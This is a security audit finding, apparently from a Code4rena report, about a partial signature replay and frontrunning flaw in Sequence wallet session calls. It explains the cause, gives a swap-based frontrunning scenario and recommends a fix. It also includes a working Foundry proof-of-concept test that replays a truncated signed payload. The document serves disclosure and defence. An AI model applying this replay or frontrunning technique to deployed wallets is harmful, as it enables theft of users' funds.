---
tags:
  - lang/solidity
  - sector/account
  - sector/dex
  - sector/staking
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/bridge/replay
  - vuln/dos/griefing
  - impact/mev/frontrun
  - fix/use-reentrancy-guard
  - novelty/variant
  - misassumption/bridge-is-secure
  - misassumption/signature-is-unique
  - fix/add-nonce
  - trigger/cross-chain-message
protocol: "[[Sequence]]"
auditors:
  - "[[montecristo]]"
report: "https://code4rena.com/reports/2025-10-sequence"
genome:
  - "[[replay]]"
  - "[[griefing]]"
  - "[[frontrun]]"
  - "[[use-reentrancy-guard]]"
  - "[[variant]]"
  - "[[bridge-message-validation]]"
  - "[[dos-resistance]]"
  - "[[fot-slippage]]"
  - "[[frontrun-exposure]]"
  - "[[permit-fork-replay]]"
  - "[[reentrancy-guard]]"
  - "[[timestamp-dependence]]"
  - "[[vote-delegation-loop]]"
---
# [H-02] Partial signature replay/frontrunning attack on session calls

- id: 63761
- impact: HIGH
- protocol: [[Sequence]]
- reporter: montecristo (Code4rena)
- source: https://code4rena.com/reports/2025-10-sequence

## Summary


This bug report discusses a vulnerability in the code that handles session calls in the `Calls.sol` and `SessionSig.sol` files. When a session call with `BEHAVIOR_REVERT_ON_ERROR` fails, the entire execution reverts but the signature remains valid. This allows attackers to forge a valid partial signature and execute calls that were not intended to run independently. Additionally, if an attacker has access to the mempool, they can frontrun a multi-call session and execute only a subset of calls, potentially causing financial loss, state corruption, or bypassing security measures. The recommended mitigation steps involve binding session call signatures to the complete payload hash to prevent partial signature replay. A proof of concept is also provided in the `POC.t.sol` file.

## Details



<https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/modules/Calls.sol# L36-L48>

<https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/modules/Calls.sol# L61-L123>

<https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/extensions/sessions/SessionSig.sol# L136-L176>

When a session call with `BEHAVIOR_REVERT_ON_ERROR` behavior fails, the entire execution reverts but the signature remains valid, since nonce is not yet consumed. Attackers can forge a valid partial signature from failed multi-call session, executing partial calls that were never intended to run independently.

Moreover, if an attacker has access to mempool, they can frontrun a multi-call session to execute only a subset of calls to either grief the legitimate call, or inflict financial damage to the wallet owners.

### Finding description and impact

The `Calls` contract consumes nonces before signature validation and execution:

[File: `src/modules/Calls.sol`](https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/modules/Calls.sol# L36-L48):
```

36:   function execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {
37:     uint256 startingGas = gasleft();
38:     Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);
39:
40:@>   _consumeNonce(decoded.space, decoded.nonce);
41:     (bool isValid, bytes32 opHash) = signatureValidation(decoded, _signature);
42:
43:     if (!isValid) {
44:       revert InvalidSignature(decoded, _signature);
45:     }
46:
47:@>   _execute(startingGas, opHash, decoded);
48:   }
```

When a call fails with `BEHAVIOR_REVERT_ON_ERROR`, the entire transaction reverts, including nonce consumption:

[File: `src/modules/Calls.sol`](https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/modules/Calls.sol# L61-L123):
```

61:
62:   function _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {
63:     bool errorFlag = false;
64:
65:     uint256 numCalls = _decoded.calls.length;
66:     for (uint256 i = 0; i < numCalls; i++) {
...
85:       if (call.delegateCall) {
...
99:       } else {
100:         (success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);
101:       }
102:
103:       if (!success) {
...
110:         if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {
111:@>         revert Reverted(_decoded, i, LibOptim.returnData());
112:         }
...
120:       emit CallSucceeded(_opHash, i);
121:     }
```

At this point, the signature is publicly visible and still valid, because nonce usage is not recorded on `Calls` contract yet.

Session signatures are validated per-call using individual call hashes, which makes partial signature replay attack possible:

[File: `src/extensions/sessions/SessionSig.sol`](https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/extensions/sessions/SessionSig.sol# L136-L176):
```

136:       for (uint256 i = 0; i < callsCount; i++) {
...
162:         // Read session signature and recover the signer
163:         {
164:           bytes32 r;
165:           bytes32 s;
166:           uint8 v;
167:           (r, s, v, pointer) = encodedSignature.readRSVCompact(pointer);
168:
169:@>         bytes32 callHash = hashCallWithReplayProtection(payload, i);
170:           callSignature.sessionSigner = ecrecover(callHash, v, r, s);
171:           if (callSignature.sessionSigner == address(0)) {
172:             revert SessionErrors.InvalidSessionSigner(address(0));
173:           }
174:         }
175:
176:         sig.callSignatures[i] = callSignature;
...
406:   function hashCallWithReplayProtection(
407:     Payload.Decoded calldata payload,
408:     uint256 callIdx
409:   ) public view returns (bytes32 callHash) {
410:     return keccak256(
411:       abi.encodePacked(
412:         payload.noChainId ? 0 : block.chainid,
413:         payload.space,
414:         payload.nonce,
415:         callIdx,
416:@>       Payload.hashCall(payload.calls[callIdx])
417:       )
418:     );
419:   }
```

Consider the following:

* **Original Payload:** Calls [A, B, C] with signatures [SigA, SigB, SigC]
* **Execution:** [A: succeed, B: succeed, C: revert]
* **Result:** Entire transaction reverts, nonce remains unused.
* **Attack:** Extract [A, B] with [SigA, SigB] and replay as new execution.

The replayed partial payload executes calls A and B without C, potentially causing:

* **Financial loss**: Token transfers that were conditional on call C succeeding.
* **State corruption**: Partial state changes that break atomicity guarantees.
* **Bypassed security**: Calls that were intended to execute only as part of complete transaction.

**Frontrunning:** This vulnerability also opens another huge attack vector: frontrunning. Mailcious parties can monitor mempool for a multi-call session and deliberately frontrun to execute only a subset of expected calls. This can either grief the legitimate session, or cause financial damage to the wallet owners.

For example:

* Legitimate session calls

  + WETH -> WBTC swap on a DEX
  + Do something profitable with acquired WBTC
  + WBTC -> WETH reversal swap
  + Final slippage check (e.g., final WETH > original WETH)
* Attacker frontruns and execute only [WETH -> WBTC] conversion, followed by their arbitraging swap [WBTC -> WETH] to take profit.
* The wallet owners suffer from a partial execution, which was not their original intention.
* Legitimate session will likely to be griefed because WETH -> WBTC swap is already done.

### Recommended mitigation steps

Bind session call signatures to the complete payload hash to prevent partial signature replay.

### Proof of Concept

Create a file `POC.t.sol` under `test` directory and put the following content:
```

// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.27;

import { Vm, console } from "forge-std/Test.sol";
import { SessionTestBase } from "test/extensions/sessions/SessionTestBase.sol";

import { PrimitivesRPC } from "test/utils/PrimitivesRPC.sol";

import { Factory } from "src/Factory.sol";
import { Stage1Module } from "src/Stage1Module.sol";
import { SessionErrors } from "src/extensions/sessions/SessionErrors.sol";
import { SessionManager } from "src/extensions/sessions/SessionManager.sol";
import { SessionSig } from "src/extensions/sessions/SessionSig.sol";
import { SessionPermissions } from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
import {
  ParameterOperation, ParameterRule, Permission, UsageLimit
} from "src/extensions/sessions/explicit/Permission.sol";
import { Attestation, LibAttestation } from "src/extensions/sessions/implicit/Attestation.sol";
import { Calls } from "src/modules/Calls.sol";
import { ERC4337v07 } from "src/modules/ERC4337v07.sol";
import { Payload } from "src/modules/Payload.sol";
import { ISapient } from "src/modules/interfaces/ISapient.sol";

contract Emitter {

  using LibAttestation for Attestation;

  event Implicit(address sender);
  event Explicit(address sender);

  error InvalidCall(string reason);

  uint256 counter;

  // Deliberately revert on the second call to emulate calls' revert behavior
  modifier notTwice() {
    counter++;
    console.log("Counter: ", counter);
    if (counter == 2) {
      console.log("Original execution reverts");
      revert("NotTwice");
    }
    _;
  }

  function implicitEmit() external notTwice {
    emit Implicit(msg.sender);
  }

  function explicitEmit() external {
    emit Explicit(msg.sender);
  }

  function acceptImplicitRequest(
    address wallet,
    Attestation calldata attestation,
    Payload.Call calldata call
  ) external pure returns (bytes32) {
    if (call.data.length != 4 || bytes4(call.data[:4]) != this.implicitEmit.selector) {
      return bytes32(0);
    }
    return attestation.generateImplicitRequestMagic(wallet);
  }

}

contract POC is SessionTestBase {

  Factory public factory;
  Stage1Module public module;
  SessionManager public sessionManager;
  Vm.Wallet public sessionWallet;
  Vm.Wallet public identityWallet;
  Emitter public target;
  address wallet;
  string config;
  string topology;

  function setUp() public {
    sessionWallet = vm.createWallet("session");
    identityWallet = vm.createWallet("identity");
    sessionManager = new SessionManager();
    factory = new Factory();
    module = new Stage1Module(address(factory), address(0));
    target = new Emitter();

    topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
    SessionPermissions memory sessionPerms = SessionPermissions({
      signer: sessionWallet.addr,
      chainId: 0,
      valueLimit: 0,
      deadline: uint64(block.timestamp + 1 days),
      permissions: new Permission[](1)
    });
    sessionPerms.permissions[0] = Permission({ target: address(target), rules: new ParameterRule[](0) });
    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
    topology = PrimitivesRPC.sessionImplicitAddBlacklistAddress(vm, topology, address(0));
    bytes32 sessionImageHash = PrimitivesRPC.sessionImageHash(vm, topology);

    {
      string memory ce = string(
        abi.encodePacked("sapient:", vm.toString(sessionImageHash), ":", vm.toString(address(sessionManager)), ":1")
      );
      config = PrimitivesRPC.newConfig(vm, 1, 0, ce);
    }
    bytes32 imageHash = PrimitivesRPC.getImageHash(vm, config);
    wallet = factory.deploy(address(module), imageHash);
  }

  function testSubmissionValidity() external {
    // A session signer creates a payload of 2 calls, both of them has REVERT_ON_ERROR behavior
    Payload.Decoded memory payload = _buildPayload(2);
    Attestation memory attestation = _createValidAttestation();
    payload.calls[0] = Payload.Call({
      to: address(target),
      value: 0,
      data: abi.encodeWithSelector(target.implicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
    });
    payload.calls[1] = Payload.Call({
      to: address(target),
      value: 0,
      data: abi.encodeWithSelector(target.implicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
    });
    string[] memory callSignatures = _createImplicitCallSignatures(payload, attestation);
    bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);
    bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
    console.log("Original execution starts");
    // The second call fails and the whole flow is reverted
    vm.expectRevert();
    Calls(wallet).execute(packedPayload, encodedSignature);
    // now the attacker can reuse partial signature to replay the calls just before the failed one
    {
      Payload.Call[] memory calls = payload.calls;
      assembly {
        mstore(calls, 1) // discard the last call from payload
        mstore(callSignatures, 1) // reuse the first call sig, discard the last one
      }
      // The following helpers don't re-generate/override call signatures
      bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);
      bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
      console.log("Attacker partial replay starts");
      Calls(wallet).execute(packedPayload, encodedSignature);
      console.log("Attacker partial replay succeeded");
    }
  }

  function _createValidAttestation() internal view returns (Attestation memory) {
    Attestation memory attestation;
    attestation.approvedSigner = sessionWallet.addr;
    attestation.authData.redirectUrl = "https://example.com";
    attestation.authData.issuedAt = uint64(block.timestamp);
    return attestation;
  }

  function _createImplicitCallSignatures(
    Payload.Decoded memory payload,
    Attestation memory attestation
  ) internal returns (string[] memory callSignatures) {
    uint256 callCount = payload.calls.length;
    callSignatures = new string[](callCount);

    for (uint256 i; i < callCount; i++) {
      callSignatures[i] = _createImplicitCallSignature(payload, i, sessionWallet, identityWallet, attestation);
    }
  }

  function _createEncodedCallSignature(
    string[] memory callSignatures
  ) internal returns (bytes memory encodedSig) {
    address[] memory explicitSigners = new address[](0);
    address[] memory implicitSigners = new address[](1);
    implicitSigners[0] = sessionWallet.addr;
    encodedSig =
      PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
    string memory signatures =
      string(abi.encodePacked(vm.toString(address(sessionManager)), ":sapient:", vm.toString(encodedSig)));
    encodedSig = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);
  }

}
```

Console output:
```

[PASS] testSubmissionValidity() (gas: 605942)
Logs:
  Original execution starts
  Counter:  1
  Counter:  2
  Original execution reverts
  Attacker partial replay starts
  Counter:  1
  Attacker partial replay succeeded
```

---
